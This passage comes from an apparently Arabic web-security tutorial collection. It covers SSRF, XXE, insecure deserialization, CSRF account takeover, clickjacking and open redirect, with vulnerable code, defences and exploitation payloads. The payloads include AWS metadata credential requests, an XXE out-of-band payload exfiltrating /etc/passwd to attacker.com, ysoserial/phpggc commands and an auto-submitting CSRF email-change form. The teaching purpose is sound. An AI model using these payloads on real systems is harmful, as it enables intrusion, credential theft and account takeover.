        <p>يجب ألا يثق الخادم بالخوارزمية القادمة من المستخدم.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح JWT None Algorithm Exploit للمهاجم بتجاوز المصادقة بالكامل، انتحال المستخدمين، رفع الصلاحيات إلى مدير، والوصول الكامل إلى APIs والتطبيقات بدون معرفة أي مفتاح سري.</p>
    `
},



{
    "title": "Server Side Request Forgery (SSRF)",
    "summary": `
        <p>تعتبر ثغرة <b>Server Side Request Forgery (SSRF)</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يسمح التطبيق للمهاجم بجعل الخادم يرسل طلبات HTTP أو شبكية إلى أهداف داخلية أو خارجية نيابة عنه.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة للوصول إلى خدمات داخلية، قراءة بيانات حساسة، تجاوز الجدران النارية، أو حتى السيطرة على البنية التحتية السحابية.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض التطبيقات تسمح للمستخدم بإدخال رابط URL ليقوم الخادم بجلب البيانات.</p>

        <p>مثال:</p>

        <pre><code>http://target.com/fetch?url=http://example.com/image.jpg</code></pre>

        <p>إذا لم يتم التحقق من الرابط يستطيع المهاجم إجبار الخادم على الوصول إلى أي عنوان آخر.</p>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// Vulnerable Example

$url = $_GET['url'];

echo file_get_contents($url);</code></pre>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>http://target.com/fetch?url=http://127.0.0.1</code></pre>

        <p>سيقوم الخادم بإرسال الطلب إلى نفسه.</p>

        <h3>الوصول إلى خدمات داخلية:</h3>

        <pre><code>http://127.0.0.1:8080</code></pre>

        <p>قد تكون هذه الخدمات غير متاحة للمستخدم الخارجي لكنها متاحة للخادم نفسه.</p>

        <h3>الوصول إلى Internal APIs:</h3>

        <pre><code>http://localhost/admin</code></pre>

        <p>إذا استطاع الخادم الوصول إليها قد تظهر بيانات حساسة.</p>

        <h3>استهداف Metadata داخل AWS:</h3>

        <pre><code>http://169.254.169.254/latest/meta-data/</code></pre>

        <p>هذا العنوان يستخدم داخل خدمات AWS للحصول على بيانات السيرفر والمفاتيح السرية.</p>

        <h3>مثال على استخراج IAM Credentials:</h3>

        <pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>

        <h3>أماكن شائعة لوجود SSRF:</h3>

        <p>1. رفع الصور عبر URL.</p>
        <p>2. Webhooks.</p>
        <p>3. أدوات Import.</p>
        <p>4. PDF Generators.</p>
        <p>5. أنظمة Preview.</p>
        <p>6. خدمات Fetch API.</p>

        <h3>بارامترات شائعة:</h3>

        <pre><code>?url=
?link=
?dest=
?redirect=
?image=</code></pre>

        <h3>اختبار SSRF باستخدام Burp Suite:</h3>

        <pre><code>GET /fetch?url=http://127.0.0.1 HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>اختبار المنافذ الداخلية:</h3>

        <pre><code>http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379</code></pre>

        <p>يمكن للمهاجم معرفة الخدمات الداخلية المفتوحة.</p>

        <h3>اختبار باستخدام DNS:</h3>

        <pre><code>http://attacker.com</code></pre>

        <p>إذا وصل الطلب إلى خادم المهاجم فهذا يعني وجود SSRF.</p>

        <h3>تجاوز الفلاتر:</h3>

        <h3>1. استخدام localhost:</h3>

        <pre><code>http://localhost</code></pre>

        <h3>2. استخدام IPv4 Decimal:</h3>

        <pre><code>http://2130706433</code></pre>

        <p>يمثل 127.0.0.1.</p>

        <h3>3. استخدام IPv6:</h3>

        <pre><code>http://[::1]</code></pre>

        <h3>4. URL Encoding:</h3>

        <pre><code>http://127.0.0.1%2fadmin</code></pre>

        <h3>5. استخدام DNS Rebinding:</h3>

        <p>لتجاوز فلاتر النطاقات.</p>

        <h3>Blind SSRF:</h3>

        <p>في بعض الحالات لا تظهر الاستجابة لكن الخادم يرسل الطلب فعلاً.</p>

        <h3>اختبار Blind SSRF:</h3>

        <pre><code>http://burpcollaborator.net</code></pre>

        <p>إذا ظهر اتصال داخل Burp Collaborator فالثغرة موجودة.</p>

        <h3>استغلال SSRF مع Redis:</h3>

        <pre><code>http://127.0.0.1:6379</code></pre>

        <p>قد يؤدي للوصول إلى Redis الداخلي.</p>

        <h3>استغلال SSRF مع Docker:</h3>

        <pre><code>http://127.0.0.1:2375</code></pre>

        <p>قد يسمح بالتحكم بحاويات Docker.</p>

        <h3>استغلال SSRF مع Jenkins:</h3>

        <pre><code>http://127.0.0.1:8080</code></pre>

        <h3>علامات تدل على وجود SSRF:</h3>

        <p>1. التطبيق يجلب بيانات من URL.</p>
        <p>2. اختلاف الاستجابة حسب الرابط.</p>
        <p>3. بطء عند استهداف منافذ مغلقة.</p>
        <p>4. ظهور بيانات داخلية.</p>

        <h3>أدوات اكتشاف SSRF:</h3>

        <pre><code>Burp Suite
Burp Collaborator
OWASP ZAP
SSRFire
Interactsh</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$allowed = [
'example.com'
];

$url = parse_url($_GET['url']);

if(in_array($url['host'], $allowed)) {
    file_get_contents($_GET['url']);
}</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Whitelist للنطاقات المسموحة.</b></p>

        <p><b>2. منع الوصول إلى localhost والعناوين الداخلية.</b></p>

        <p><b>3. منع الوصول إلى 127.0.0.1 و 169.254.169.254.</b></p>

        <p><b>4. التحقق من DNS و IP الحقيقي.</b></p>

        <p><b>5. عزل الخدمات الداخلية عن الإنترنت.</b></p>

        <p><b>6. استخدام Firewall داخلي.</b></p>

        <p><b>7. تعطيل إعادة التوجيه Redirects.</b></p>

        <h3>مثال على تحقق آمن:</h3>

        <pre><code>filter_var($url, FILTER_VALIDATE_URL)</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر SSRF من أخطر الثغرات لأنها قد تسمح بالوصول إلى الشبكات الداخلية، استخراج بيانات الخدمات السحابية، تجاوز الجدران النارية، والوصول إلى أنظمة الإدارة الداخلية والسيطرة الكاملة على البنية التحتية.</p>
    `
},



{
    "title": "XML External Entity (XXE)",
    "summary": `
        <p>تعتبر ثغرة <b>XML External Entity (XXE)</b> من أخطر ثغرات معالجة XML، وتحدث عندما يقوم التطبيق بتحليل بيانات XML غير موثوقة مع تفعيل دعم الكيانات الخارجية (External Entities).</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لقراءة ملفات حساسة من الخادم، تنفيذ طلبات داخلية، تنفيذ SSRF، أو التسبب في تعطيل الخدمة.</p>

        <h3>ما هو XML ؟</h3>

        <p>XML اختصار لـ <b>Extensible Markup Language</b> ويستخدم لتبادل البيانات بين الأنظمة والتطبيقات.</p>

        <h3>مثال على XML:</h3>

        <pre><code>&lt;user&gt;
    &lt;name&gt;admin&lt;/name&gt;
&lt;/user&gt;</code></pre>

        <h3>ما هي External Entities ؟</h3>

        <p>هي كيانات تسمح لـ XML بتحميل بيانات من ملفات أو روابط خارجية.</p>

        <h3>مثال على Entity:</h3>

        <pre><code>&lt;!ENTITY test "Hello"&gt;</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يقوم XML Parser بتحليل External Entities القادمة من المستخدم.</p>

        <h3>مثال على XML ضعيف:</h3>

        <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;

&lt;user&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;</code></pre>

        <p>سيقوم الخادم بقراءة ملف:</p>

        <pre><code>/etc/passwd</code></pre>

        <h3>مثال على قراءة ملفات Windows:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"&gt;</code></pre>

        <h3>اختبار XXE داخل طلب HTTP:</h3>

        <pre><code>POST /api/xml HTTP/1.1
Content-Type: application/xml

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;

&lt;data&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/data&gt;</code></pre>

        <h3>XXE إلى SSRF:</h3>

        <p>يمكن استخدام XXE لإجبار الخادم على إرسال طلبات داخلية.</p>

        <pre><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080"&gt;</code></pre>

        <h3>استهداف AWS Metadata:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM
"http://169.254.169.254/latest/meta-data/"&gt;</code></pre>

        <h3>Blind XXE:</h3>

        <p>في بعض الحالات لا تظهر البيانات مباشرة لكن الخادم ينفذ الطلب.</p>

        <h3>اختبار Blind XXE:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM
"http://attacker.com/xxe"&gt;</code></pre>

        <p>إذا وصل الطلب إلى خادم المهاجم فالثغرة موجودة.</p>

        <h3>Out-of-Band XXE:</h3>

        <p>يقوم الخادم بإرسال البيانات إلى خادم خارجي يتحكم به المهاجم.</p>

        <h3>مثال:</h3>

        <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY exfil SYSTEM
'http://attacker.com/?x=%file;'&gt;"&gt;
%eval;
%exfil;</code></pre>

        <h3>Billion Laughs Attack:</h3>

        <p>هجوم يؤدي لاستهلاك الذاكرة وتعطيل الخدمة.</p>

        <pre><code>&lt;!ENTITY lol "lol"&gt;
&lt;!ENTITY lol2 "&lol;&lol;"&gt;
&lt;!ENTITY lol3 "&lol2;&lol2;"&gt;</code></pre>

        <h3>أماكن شائعة لوجود XXE:</h3>

        <p>1. APIs التي تستخدم XML.</p>
        <p>2. SOAP Services.</p>
        <p>3. SVG Uploads.</p>
        <p>4. Office Documents.</p>
        <p>5. SAML Authentication.</p>
        <p>6. RSS Readers.</p>

        <h3>أنواع Content-Type الشائعة:</h3>

        <pre><code>application/xml
text/xml
application/soap+xml</code></pre>

        <h3>علامات تدل على وجود XXE:</h3>

        <p>1. التطبيق يقبل XML.</p>
        <p>2. ظهور أخطاء XML.</p>
        <p>3. إمكانية قراءة ملفات.</p>
        <p>4. اختلاف الاستجابة بعد إدخال Entities.</p>

        <h3>أدوات اختبار XXE:</h3>

        <pre><code>Burp Suite
OWASP ZAP
XXEinjector
Postman</code></pre>

        <h3>مثال على Parser ضعيف في PHP:</h3>

        <pre><code>libxml_disable_entity_loader(false);</code></pre>

        <h3>مثال على Parser آمن:</h3>

        <pre><code>libxml_disable_entity_loader(true);</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. تعطيل External Entities.</b></p>

        <p><b>2. استخدام JSON بدلاً من XML عند الإمكان.</b></p>

        <p><b>3. تحديث XML Parsers باستمرار.</b></p>

        <p><b>4. تعطيل DTD Processing.</b></p>

        <p><b>5. منع الوصول إلى الملفات المحلية.</b></p>

        <p><b>6. عزل الخادم عن الشبكات الداخلية.</b></p>

        <h3>مثال على تعطيل DTD:</h3>

        <pre><code>factory.setFeature(
"http://apache.org/xml/features/disallow-doctype-decl",
true
);</code></pre>

        <h3>استخدام Whitelist:</h3>

        <p>السماح فقط بأنواع بيانات XML المعروفة.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر XXE من أخطر ثغرات الويب لأنها قد تسمح بقراءة ملفات النظام، تنفيذ SSRF، استخراج بيانات حساسة، الوصول إلى الشبكات الداخلية، أو تعطيل الخدمة بالكامل.</p>
    `
},



{
    "title": "Insecure Deserialization Attack",
    "summary": `
        <p>تعتبر ثغرة <b>Insecure Deserialization</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يقوم التطبيق بفك (Deserialize) بيانات غير موثوقة قادمة من المستخدم بدون التحقق منها بشكل آمن.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتنفيذ أوامر على الخادم، تجاوز المصادقة، تعديل البيانات، أو تنفيذ Remote Code Execution (RCE).</p>

        <h3>ما هو Serialization ؟</h3>

        <p>Serialization هو تحويل الكائنات Objects إلى صيغة قابلة للتخزين أو الإرسال.</p>

        <h3>مثال:</h3>

        <pre><code>User Object → String/Base64/JSON</code></pre>

        <h3>ما هو Deserialization ؟</h3>

        <p>هو إعادة تحويل البيانات إلى Object داخل التطبيق.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام التطبيق بفك بيانات يمكن للمستخدم تعديلها، يستطيع المهاجم إنشاء Object خبيث يؤدي لتنفيذ وظائف خطيرة.</p>

        <h3>مثال على PHP Serialization:</h3>

        <pre><code>O:4:"User":2:{
s:4:"name";
s:5:"admin";
s:4:"role";
s:5:"admin";
}</code></pre>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// Vulnerable Example

$data = $_COOKIE['session'];

$user = unserialize($data);</code></pre>

        <p>إذا استطاع المهاجم تعديل Cookie يمكنه إرسال Object خبيث.</p>

        <h3>تعديل الصلاحيات:</h3>

        <pre><code>O:4:"User":2:{
s:4:"name";
s:5:"admin";
s:4:"role";
s:5:"admin";
}</code></pre>

        <h3>Remote Code Execution:</h3>

        <p>بعض التطبيقات تحتوي على Classes تنفذ أوامر عند Deserialization.</p>

        <h3>مثال:</h3>

        <pre><code>class Exploit {
    function __destruct() {
        system("id");
    }
}</code></pre>

        <p>إذا تم فك هذا Object سيتم تنفيذ الأمر.</p>

        <h3>PHP Magic Methods الخطيرة:</h3>

        <pre><code>__wakeup()
__destruct()
__toString()</code></pre>

        <h3>Java Deserialization:</h3>

        <pre><code>ObjectInputStream.readObject()</code></pre>

        <p>إذا تم فك بيانات غير موثوقة قد يؤدي ذلك إلى RCE.</p>

        <h3>Python Pickle Vulnerability:</h3>

        <pre><code>pickle.loads(user_input)</code></pre>

        <p>يمكن استغلال Pickle لتنفيذ أوامر نظام.</p>

        <h3>.NET Deserialization:</h3>

        <pre><code>BinaryFormatter.Deserialize()</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Cookies.</p>
        <p>2. Sessions.</p>
        <p>3. APIs.</p>
        <p>4. Tokens.</p>
        <p>5. ملفات Cache.</p>
        <p>6. أنظمة التخزين المؤقت.</p>

        <h3>علامات تدل على وجود Serialization:</h3>

        <p>1. وجود بيانات Base64 طويلة.</p>
        <p>2. ظهور:</p>

        <pre><code>O:
a:
s:</code></pre>

        <p>داخل البيانات.</p>

        <h3>مثال على Base64 Serialized Data:</h3>

        <pre><code>Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بتعديل البيانات المشفرة وإعادة إرسالها.</p>

        <h3>استغلال عبر Cookies:</h3>

        <pre><code>Cookie: session=SERIALIZED_OBJECT</code></pre>

        <h3>استغلال عبر APIs:</h3>

        <pre><code>POST /api/data

{
"data":"SERIALIZED_PAYLOAD"
}</code></pre>

        <h3>أدوات اختبار Insecure Deserialization:</h3>

        <pre><code>ysoserial
Burp Suite
PHPGGC
SerialKiller
ysoserial.net</code></pre>

        <h3>اختبار Java باستخدام ysoserial:</h3>

        <pre><code>java -jar ysoserial.jar CommonsCollections1 "id"</code></pre>

        <h3>اختبار PHP باستخدام PHPGGC:</h3>

        <pre><code>phpggc monolog/rce1 system id</code></pre>

        <h3>علامات خطيرة:</h3>

        <p>1. استخدام unserialize().</p>
        <p>2. استخدام pickle.loads().</p>
        <p>3. استخدام BinaryFormatter.</p>
        <p>4. فك بيانات قادمة من المستخدم.</p>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$data = json_decode($input, true);</code></pre>

        <h3>استخدام JSON بدلاً من Serialization:</h3>

        <p>يفضل استخدام JSON لأنه لا ينشئ Objects تلقائياً.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. عدم فك بيانات غير موثوقة.</b></p>

        <p><b>2. استخدام JSON بدلاً من Native Serialization.</b></p>

        <p><b>3. توقيع البيانات الحساسة.</b></p>

        <p><b>4. استخدام Integrity Checks.</b></p>

        <p><b>5. تعطيل Deserialization للـ Classes الخطيرة.</b></p>

        <p><b>6. تحديث المكتبات باستمرار.</b></p>

        <p><b>7. استخدام Allowlist للـ Classes المسموحة.</b></p>

        <h3>مثال على Allowlist:</h3>

        <pre><code>allowed_classes => ['User']</code></pre>

        <h3>مثال على توقيع البيانات:</h3>

        <pre><code>HMAC(serialized_data)</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Insecure Deserialization من أخطر الثغرات لأنها قد تؤدي إلى Remote Code Execution، تجاوز المصادقة، سرقة البيانات، والسيطرة الكاملة على الخادم والتطبيق.</p>
    `
},



{
    "title": "CSRF Account Takeover",
    "summary": `
        <p>تعتبر ثغرة <b>CSRF Account Takeover</b> من أخطر أنواع هجمات Cross-Site Request Forgery، وتحدث عندما يتمكن المهاجم من إجبار المستخدم الضحية على تنفيذ طلبات حساسة تؤدي إلى السيطرة على الحساب.</p>

        <p>يعتمد الهجوم على استغلال جلسة المستخدم المسجل دخوله مسبقاً داخل الموقع.</p>

        <h3>ما هو CSRF ؟</h3>

        <p>CSRF اختصار لـ <b>Cross-Site Request Forgery</b>.</p>

        <p>يقوم المهاجم بخداع الضحية لإرسال طلب HTTP إلى الموقع المستهدف باستخدام Session Cookies الخاصة بها.</p>

        <h3>كيف يحدث Account Takeover ؟</h3>

        <p>إذا احتوى الموقع على وظائف حساسة بدون CSRF Protection يمكن للمهاجم تنفيذ إجراءات تؤدي إلى السيطرة على الحساب.</p>

        <h3>أمثلة على الوظائف الحساسة:</h3>

        <p>1. تغيير البريد الإلكتروني.</p>
        <p>2. تغيير كلمة المرور.</p>
        <p>3. ربط حسابات جديدة.</p>
        <p>4. تعطيل MFA.</p>

        <h3>مثال على طلب تغيير البريد:</h3>

        <pre><code>POST /change-email HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123

email=attacker@evil.com</code></pre>

        <p>إذا لم يكن هناك CSRF Token يستطيع المهاجم إجبار الضحية على إرسال الطلب.</p>

        <h3>صفحة الهجوم:</h3>

        <pre><code>&lt;form action="http://target.com/change-email"
method="POST"&gt;

&lt;input type="hidden"
name="email"
value="attacker@evil.com"&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;

&lt;/form&gt;</code></pre>

        <p>بمجرد زيارة الضحية للصفحة سيتم إرسال الطلب تلقائياً.</p>

        <h3>النتيجة:</h3>

        <p>يتم تغيير البريد الإلكتروني إلى بريد المهاجم.</p>

        <h3>ثم يقوم المهاجم بتنفيذ:</h3>

        <p>Forgot Password → Reset Password → السيطرة على الحساب.</p>

        <h3>CSRF لتغيير كلمة المرور:</h3>

        <pre><code>POST /change-password

new_password=123456</code></pre>

        <p>إذا لم يطلب الموقع كلمة المرور الحالية قد يتم اختطاف الحساب مباشرة.</p>

        <h3>CSRF لتعطيل MFA:</h3>

        <pre><code>POST /disable-mfa</code></pre>

        <h3>CSRF داخل APIs:</h3>

        <pre><code>POST /api/user/update</code></pre>

        <p>إذا اعتمدت API على Cookies فقط قد تكون معرضة للهجوم.</p>

        <h3>شروط نجاح الهجوم:</h3>

        <p>1. الضحية مسجلة الدخول.</p>
        <p>2. الموقع يعتمد على Cookies.</p>
        <p>3. غياب CSRF Tokens.</p>
        <p>4. عدم التحقق من Origin أو Referer.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بحذف:</p>

        <pre><code>CSRF Token</code></pre>

        <p>ثم يعيد إرسال الطلب.</p>

        <p>إذا تم تنفيذ العملية فالثغرة موجودة.</p>

        <h3>اختبار SameSite Cookies:</h3>

        <pre><code>Set-Cookie:
PHPSESSID=abc;
SameSite=None</code></pre>

        <p>هذا يسمح بإرسال الكوكيز عبر مواقع خارجية.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. تغيير البريد الإلكتروني.</p>
        <p>2. تغيير كلمة المرور.</p>
        <p>3. الإعدادات الأمنية.</p>
        <p>4. لوحات الإدارة.</p>
        <p>5. APIs.</p>

        <h3>علامات تدل على وجود CSRF:</h3>

        <p>1. عدم وجود CSRF Token.</p>
        <p>2. قبول POST Requests بدون تحقق.</p>
        <p>3. غياب Origin Validation.</p>
        <p>4. استخدام Cookies فقط للمصادقة.</p>

        <h3>استغلال GET Requests:</h3>

        <pre><code>&lt;img src=
"http://target.com/change-email?email=attacker@evil.com"&gt;</code></pre>

        <p>إذا نفذ الموقع العملية عبر GET فهذه مشكلة خطيرة.</p>

        <h3>أدوات اختبار CSRF:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman</code></pre>

        <h3>مثال على CSRF Token:</h3>

        <pre><code>&lt;input type="hidden"
name="csrf_token"
value="RANDOM_TOKEN"&gt;</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام CSRF Tokens عشوائية.</b></p>

        <p><b>2. التحقق من Origin و Referer.</b></p>

        <p><b>3. استخدام SameSite Cookies.</b></p>

        <pre><code>SameSite=Strict</code></pre>

        <h3>4. طلب كلمة المرور الحالية للعمليات الحساسة.</h3>

        <h3>5. استخدام MFA.</h3>

        <h3>6. منع تنفيذ العمليات الحساسة عبر GET.</h3>

        <h3>مثال على Cookie آمنة:</h3>

        <pre><code>Set-Cookie:
PHPSESSID=abc;
HttpOnly;
Secure;
SameSite=Strict</code></pre>

        <h3>التحقق من Origin:</h3>

        <pre><code>Origin: https://target.com</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح CSRF Account Takeover للمهاجم بالسيطرة الكاملة على حسابات المستخدمين بدون معرفة كلمات المرور، عبر استغلال جلسات المستخدمين المسجلين دخولهم وتنفيذ طلبات حساسة نيابة عنهم.</p>
    `
},



{
    "title": "Clickjacking Attack",
    "summary": `
        <p>تعتبر ثغرة <b>Clickjacking</b> من هجمات واجهات المستخدم (UI Redressing Attacks)، وتحدث عندما يقوم المهاجم بخداع الضحية للنقر على عناصر مخفية داخل صفحة ويب دون أن تدرك ذلك.</p>

        <p>يعتمد الهجوم على تحميل الموقع المستهدف داخل Iframe مخفي أو شفاف ثم وضع عناصر مزيفة فوقه لإجبار الضحية على تنفيذ عمليات خطيرة.</p>

        <h3>كيف يعمل الهجوم؟</h3>

        <p>يقوم المهاجم بإنشاء صفحة تحتوي على:</p>

        <p>1. Iframe يحمل الموقع المستهدف.</p>
        <p>2. طبقات CSS شفافة.</p>
        <p>3. زر أو صورة مزيفة لجذب الضحية.</p>

        <h3>مثال على Clickjacking:</h3>

        <pre><code>&lt;iframe src="http://target.com/account/delete"
style="opacity:0;
position:absolute;
top:0;
left:0;
width:500px;
height:500px;"&gt;
&lt;/iframe&gt;

&lt;button&gt;Click Here To Win&lt;/button&gt;</code></pre>

        <p>الضحية تعتقد أنها تضغط على الزر المزيف بينما في الحقيقة تضغط على زر داخل الموقع الحقيقي.</p>

        <h3>أهداف شائعة للهجوم:</h3>

        <p>1. تغيير الإعدادات.</p>
        <p>2. حذف الحسابات.</p>
        <p>3. تفعيل التحويلات المالية.</p>
        <p>4. منح صلاحيات للتطبيقات.</p>
        <p>5. تشغيل الكاميرا أو الميكروفون.</p>

        <h3>مثال على استغلال زر حذف الحساب:</h3>

        <pre><code>http://target.com/delete-account</code></pre>

        <p>يتم وضع الزر الحقيقي خلف زر مزيف.</p>

        <h3>Clickjacking مع مواقع التواصل:</h3>

        <p>يمكن خداع المستخدم للضغط على:</p>

        <pre><code>Like
Follow
Authorize App</code></pre>

        <h3>استغلال OAuth Authorization:</h3>

        <p>قد يتم خداع الضحية للموافقة على تطبيق خبيث.</p>

        <h3>اختبار Clickjacking:</h3>

        <p>يقوم المختبر بمحاولة تحميل الموقع داخل iframe.</p>

        <pre><code>&lt;iframe src="http://target.com"&gt;
&lt;/iframe&gt;</code></pre>

        <p>إذا ظهر الموقع داخل iframe فالحماية غير موجودة.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. غياب X-Frame-Options.</p>
        <p>2. غياب CSP frame-ancestors.</p>
        <p>3. إمكانية تحميل الموقع داخل iframe.</p>

        <h3>مثال على استجابة ضعيفة:</h3>

        <pre><code>HTTP/1.1 200 OK</code></pre>

        <p>بدون أي Headers حماية.</p>

        <h3>X-Frame-Options:</h3>

        <p>Header يستخدم لمنع تحميل الموقع داخل iframe.</p>

        <h3>القيم الممكنة:</h3>

        <pre><code>DENY
SAMEORIGIN</code></pre>

        <h3>مثال آمن:</h3>

        <pre><code>X-Frame-Options: DENY</code></pre>

        <h3>أو:</h3>

        <pre><code>X-Frame-Options: SAMEORIGIN</code></pre>

        <h3>استخدام Content Security Policy:</h3>

        <pre><code>Content-Security-Policy:
frame-ancestors 'none';</code></pre>

        <h3>السماح فقط لنفس النطاق:</h3>

        <pre><code>Content-Security-Policy:
frame-ancestors 'self';</code></pre>

        <h3>Double Clickjacking:</h3>

        <p>استخدام عدة طبقات iframe لخداع الضحية.</p>

        <h3>Cursor Manipulation:</h3>

        <p>تحريك المؤشر لإجبار المستخدم على الضغط على عنصر مخفي.</p>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <p>يمكن فحص Headers الخاصة بالحماية.</p>

        <h3>اختبار عبر المتصفح:</h3>

        <pre><code>&lt;iframe src="http://target.com"&gt;</code></pre>

        <p>إذا تم تحميل الصفحة فالثغرة موجودة.</p>

        <h3>أماكن شائعة لوجود Clickjacking:</h3>

        <p>1. لوحات الإدارة.</p>
        <p>2. إعدادات الحساب.</p>
        <p>3. صفحات الدفع.</p>
        <p>4. صفحات OAuth.</p>
        <p>5. أنظمة البنوك.</p>

        <h3>أدوات اختبار Clickjacking:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Clickbandit
Browser DevTools</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام X-Frame-Options.</b></p>

        <p><b>2. استخدام CSP frame-ancestors.</b></p>

        <p><b>3. منع تحميل الصفحات الحساسة داخل iframe.</b></p>

        <p><b>4. حماية العمليات الحساسة عبر CSRF Tokens.</b></p>

        <p><b>5. طلب إعادة المصادقة للعمليات المهمة.</b></p>

        <h3>مثال على حماية كاملة:</h3>

        <pre><code>X-Frame-Options: DENY

Content-Security-Policy:
frame-ancestors 'none';</code></pre>

        <h3>Frame Busting Scripts:</h3>

        <pre><code>if(top !== self) {
    top.location = self.location;
}</code></pre>

        <p>لكن لا يعتمد عليها وحدها لأنها قابلة للتجاوز.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح Clickjacking بخداع المستخدمين لتنفيذ عمليات حساسة بدون علمهم، مثل حذف الحسابات، تحويل الأموال، منح صلاحيات للتطبيقات، أو السيطرة على الحسابات.</p>
    `
},



{
    "title": "Open Redirect Vulnerability",
    "summary": `
        <p>تعتبر ثغرة <b>Open Redirect</b> من ثغرات إعادة التوجيه غير الآمنة، وتحدث عندما يسمح التطبيق للمستخدم بالتحكم في رابط التحويل Redirect بدون التحقق منه.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لإعادة توجيه الضحايا إلى مواقع خبيثة، سرقة بيانات تسجيل الدخول، تنفيذ حملات تصيد احتيالي (Phishing)، أو تجاوز بعض أنظمة الحماية.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض المواقع تستخدم بارامترات للتحويل بعد تسجيل الدخول أو العمليات المختلفة.</p>

        <h3>مثال:</h3>

        <pre><code>http://target.com/redirect?url=http://google.com</code></pre>

        <p>إذا لم يتحقق التطبيق من الرابط يمكن للمهاجم استبداله بموقع خبيث.</p>

        <h3>مثال على رابط خبيث:</h3>

        <pre><code>http://target.com/redirect?url=http://evil.com</code></pre>

        <p>الضحية ترى دومين الموقع الحقيقي ثم يتم تحويلها إلى موقع المهاجم.</p>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// Vulnerable Example

header("Location: " . $_GET['url']);</code></pre>

        <h3>استغلال الثغرة في التصيد الاحتيالي:</h3>

        <p>يقوم المهاجم بإرسال رابط يبدو موثوقاً:</p>

        <pre><code>https://target.com/redirect?url=http://evil.com/login</code></pre>

        <p>ثم يتم تحويل الضحية إلى صفحة مزيفة لسرقة كلمات المرور.</p>

        <h3>Open Redirect بعد تسجيل الدخول:</h3>

        <pre><code>/login?next=http://evil.com</code></pre>

        <p>بعد نجاح تسجيل الدخول يتم تحويل الضحية إلى الموقع الخبيث.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. صفحات تسجيل الدخول.</p>
        <p>2. صفحات تسجيل الخروج.</p>
        <p>3. أنظمة OAuth.</p>
        <p>4. صفحات إعادة التوجيه.</p>
        <p>5. APIs.</p>

        <h3>بارامترات شائعة:</h3>

        <pre><code>?url=
?redirect=
?next=
?return=
?continue=</code></pre>

        <h3>اختبار الثغرة:</h3>

        <pre><code>http://target.com/redirect?url=http://evil.com</code></pre>

        <p>إذا تم التحويل للموقع الخارجي فالثغرة موجودة.</p>

        <h3>اختبار باستخدام //:</h3>

        <pre><code>http://target.com/redirect?url=//evil.com</code></pre>

        <h3>اختبار باستخدام URL Encoding:</h3>

        <pre><code>http://target.com/redirect?url=http%3A%2F%2Fevil.com</code></pre>

        <h3>تجاوز الفلاتر:</h3>

        <h3>1. استخدام //:</h3>

        <pre><code>//evil.com</code></pre>

        <h3>2. استخدام @:</h3>

        <pre><code>http://target.com@evil.com</code></pre>

        <h3>3. استخدام Subdomains:</h3>

        <pre><code>http://target.com.evil.com</code></pre>

        <h3>4. استخدام UTF-8 Encoding:</h3>

        <pre><code>%2e%2e</code></pre>

        <h3>Open Redirect داخل OAuth:</h3>

        <pre><code>redirect_uri=http://evil.com</code></pre>

